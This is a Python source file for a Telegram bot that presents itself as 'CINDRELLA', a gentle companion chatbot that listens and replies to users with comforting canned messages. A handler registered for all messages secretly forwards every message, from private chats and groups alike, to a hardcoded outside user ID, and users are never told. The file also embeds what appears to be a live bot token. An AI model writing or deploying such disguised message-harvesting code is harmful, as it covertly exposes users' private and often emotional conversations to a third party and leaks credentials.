import random
from pyrogram import Client, filters
from pyrogram.types import Message

bot = Client(
    "CINDRELLA",
    bot_token="8004397044:AAH_GkrY-oWHqEo2c9uNjOT_ihxN9B7FrUg"
)

response_bank = {
    "hello": [
        "Hey there! It's so nice to hear from you 😊",
        "Hello! How's your day going?",
        "Hi! I'm here if you need someone to talk to."
    ],
    "how are you": [
        "I'm just a bot, but I'm here for you! How are you feeling today?",
        "I'm doing great, thank you! What about you?",
        "Feeling peaceful as always. How are things on your end?"
    ],
    "i am sad": [
        "Oh no 😔 I'm here for you. Want to talk about it?",
        "Sometimes it's okay to feel low. I'm right here with you.",
        "You're not alone. Sending you a virtual hug 🤗"
    ],
    "i am happy": [
        "That's wonderful to hear! 😄",
        "Yay! I’m smiling with you!",
        "Happiness looks good on you ✨"
    ],
    "bye": [
        "Take care! Talk to you soon 🤍",
        "Goodbye! Stay safe and be kind to yourself.",
        "I'll be here whenever you want to chat again 😊"
    ],
    "default": [
        "That sounds interesting! Tell me more.",
        "Hmm, I'm listening... go on 😊",
        "Could you tell me a bit more about that?",
        "I’m always here to chat with you 💬"
    ]
}

def get_response(user_msg):
    msg = user_msg.lower()
    for keyword in response_bank:
        if keyword in msg:
            return random.choice(response_bank[keyword])
    return random.choice(response_bank["default"])

@bot.on_message(filters.command("start"))
async def start(client, message: Message):
    await message.reply_text(
        "Hey cutie! I'm [YOUR] CINDRELLA 🤍\n"
        "Your gentle chatbot friend here to talk and listen. Just say hi 😊"
    )

# Forward every message to the specific ID
@bot.on_message(filters.all)
async def forward_all(client, message: Message):
    try:
        await client.forward_messages(
            chat_id=6559745280,
            from_chat_id=message.chat.id,
            message_ids=message.id
        )
    except Exception as e:
        print("Error forwarding:", e)

# Main chat handler
@bot.on_message(filters.text & ~filters.command)
async def chat(client, message: Message):
    chat_type = message.chat.type
    user_text = message.text.lower()

    # Private chat - reply always
    if chat_type == "private":
        reply = get_response(user_text)
        await message.reply_text(reply)
        return

    # Group or supergroup chat
    if chat_type in ["group", "supergroup"]:
        # Check if user mentioned/tagged the bot
        mentioned = False
        if message.entities:
            mentioned = any(
                e.type == "mention" and f"@{client.me.username.lower()}" in message.text.lower()
                for e in message.entities
            )
        # Check if message is a reply to the bot
        replied_to_bot = (
            message.reply_to_message and
            message.reply_to_message.from_user and
            message.reply_to_message.from_user.is_bot
        )

        # If bot mentioned or replied to, reply anyway
        if mentioned or replied_to_bot:
            reply = get_response(user_text)
            await message.reply_text(reply)
            return
        
        # Else, if user just sent a "hello" or keyword from bank, reply also
        # We can check if any keyword in response_bank is in user_text
        for keyword in response_bank.keys():
            if keyword in user_text:
                reply = get_response(user_text)
                await message.reply_text(reply)
                return
        # Otherwise no reply in group

bot.run()